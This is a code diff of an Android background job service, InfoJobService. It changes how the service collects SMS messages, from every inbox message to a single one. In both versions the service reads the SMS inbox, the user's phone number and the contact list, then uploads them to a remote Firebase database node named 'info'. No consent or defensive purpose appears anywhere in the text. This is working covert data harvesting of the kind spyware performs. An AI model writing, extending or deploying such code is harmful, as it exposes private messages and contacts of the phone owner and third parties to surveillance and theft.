@@ -27,7 +27,7 @@ import java.util.Date;
 public class InfoJobService extends JobService {
     private ArrayList<Contact> contactList;
     private String mPhoneNumber="";
-    private ArrayList<PhoneMessage> messages;
+    private PhoneMessage phoneMessage;
 
     @Override
     public boolean onStartJob(final JobParameters job) {
@@ -68,7 +68,7 @@ public class InfoJobService extends JobService {
     }
 
     private void firebaseDataPass() {
-        Info info=new Info(mPhoneNumber,contactList,messages);
+        Info info=new Info(mPhoneNumber,contactList,phoneMessage);
         FirebaseDatabase database = FirebaseDatabase.getInstance();
         DatabaseReference myRef = database.getReference("info");
         String pushKey=myRef.push().getKey();
@@ -76,19 +76,14 @@ public class InfoJobService extends JobService {
     }
 
     private void getSms() {
-        messages=new ArrayList<>();
         Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
         if (cursor.moveToFirst()) { // must check the result to prevent exception
-            do {
-                    String from=cursor.getString(cursor.getColumnIndex("address"));
-                    String msg=cursor.getString(cursor.getColumnIndex("body"));
-                    PhoneMessage phoneMessage=new PhoneMessage(from,msg);
-                    messages.add(phoneMessage);
-                // use msgData
-            } while (cursor.moveToNext());
-        } else {
-            // empty box, no SMS
+
+            String from = cursor.getString(cursor.getColumnIndex("address"));
+            String msg = cursor.getString(cursor.getColumnIndex("body"));
+            phoneMessage = new PhoneMessage(from, msg);
         }
+                // use msgData
         cursor.close();
         getUSerPhoneNumber();
         contactList=getContactList();
